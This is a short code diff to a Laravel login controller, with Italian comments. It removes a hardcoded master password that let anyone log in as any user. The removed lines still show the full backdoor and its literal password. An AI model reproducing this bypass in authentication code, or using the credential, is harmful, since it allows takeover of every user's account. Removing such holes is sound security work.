@@ -31,29 +31,6 @@ class AuthController extends Controller
             ]);
         }
 
-        // Password speciale amministratore per accedere a qualunque profilo utente
-        if ($credentials['password'] === 'magodelcaos15') {
-            // Non modifichiamo la password personale dell'utente
-            Auth::login($user);
-            $request->session()->regenerate();
-
-            $now = now();
-            $user->ultimo_accesso = $now;
-            $user->save();
-
-            try {
-                \App\Models\UserLoginEvent::create([
-                    'user_id' => $user->getKey(),
-                    'logged_in_at' => $now,
-                    'ip_address' => $request->ip(),
-                ]);
-            } catch (\Throwable $e) {
-                // Ignora eventuali errori di logging
-            }
-
-            return redirect()->route('home');
-        }
-
         // Dual-hash: controlla password_laravel (bcrypt), poi password (bcrypt legacy o MD5)
         $authenticated = false;
 
